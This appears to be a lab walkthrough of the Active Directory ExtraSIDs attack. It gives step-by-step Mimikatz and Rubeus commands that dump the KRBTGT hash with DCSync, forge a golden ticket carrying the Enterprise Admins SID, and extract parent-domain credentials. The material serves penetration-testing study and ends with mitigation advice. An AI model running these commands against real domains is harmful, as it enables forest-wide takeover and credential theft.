### **SID History Primer**

The `sidHistory` attribute is used during migration scenarios. When a user is migrated from one domain to another, a new account is created in the second domain. To ensure that the user retains access to resources in the original domain, the original user's SID is added to the `sidHistory` attribute of the new account.

SID history works across domains but can also function within the same domain. Attackers can use tools like `Mimikatz` to inject a Domain Adminâ€™s SID into an account they control. When this manipulated account logs in, all associated SIDs are added to the user's token, granting it unauthorized access.

If the `sidHistory` of a `Domain Admin` is added to a controlled account, the attacker can perform `DCSync`, create a `Golden Ticket`, and persist within the domain.

### **ExtraSIDs Attack - Mimikatz**

The `ExtraSIDs` attack allows for the compromise of a parent domain once a child domain is compromised. Within the same Active Directory (AD) forest, `sidHistory` is respected due to a lack of SID Filtering.

An attacker who has compromised the child domain can modify `sidHistory` to include the SID of the `Enterprise Admins` group in the parent domain. This effectively grants full access to the parent domain without actually being a member of the group.

**Prerequisites for ExtraSIDs Attack:**

- The `KRBTGT` hash for the child domain.
- The SID for the child domain.
- The name of a target user in the child domain (does not need to exist).
- The FQDN of the child domain.
- The SID of the `Enterprise Admins` group in the root domain.

### **Gathering Required Data**

#### **Step 1: Obtain the NT Hash for the KRBTGT Account**

The `KRBTGT` account is used to encrypt/sign all Kerberos tickets within a domain. If an attacker obtains its hash, they can generate forged tickets.

Run `Mimikatz` as a Domain Admin in the child domain:
```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

Output will include:
```powershell
Hash NTLM: 9d765b482771505cbe97411065964d5f
```

#### **Step 2: Get the SID for the Child Domain**

Use `PowerView`:
```powershell
Get-DomainSID
```

#### **Step 3: Obtain the SID for the Enterprise Admins Group**
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
```

### **Executing the Attack**

#### **Step 1: Confirm No Access to the Parent Domain**
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```
Expected output:
```powershell
Access is denied.
```

#### **Step 2: Generate a Golden Ticket Using Mimikatz**
```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### **Step 3: Verify the Ticket is Loaded in Memory**
```powershell
klist
```
Expected output:
```powershell
#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
```

### **Alternative Execution Using Rubeus**

#### **Step 1: Generate a Golden Ticket with Rubeus**
```powershell
Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

#### **Step 2: Verify Ticket in Memory**
```powershell
klist
```
Expected output:
```powershell
#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
```

### **Performing a DCSync Attack on the Parent Domain**

With the Golden Ticket, we can now perform a `DCSync` attack to extract credentials from the parent domain:
```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

If dealing with multiple domains, specify the target domain:
```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---
### **Conclusion**

The `ExtraSIDs` attack is a powerful way to pivot from a compromised child domain to its parent. By leveraging `Mimikatz` or `Rubeus`, attackers can manipulate `sidHistory` and forge `Golden Tickets`, effectively bypassing traditional access controls. Organizations should implement strong monitoring, logging, and periodic password resets for the `KRBTGT` account to mitigate these risks.
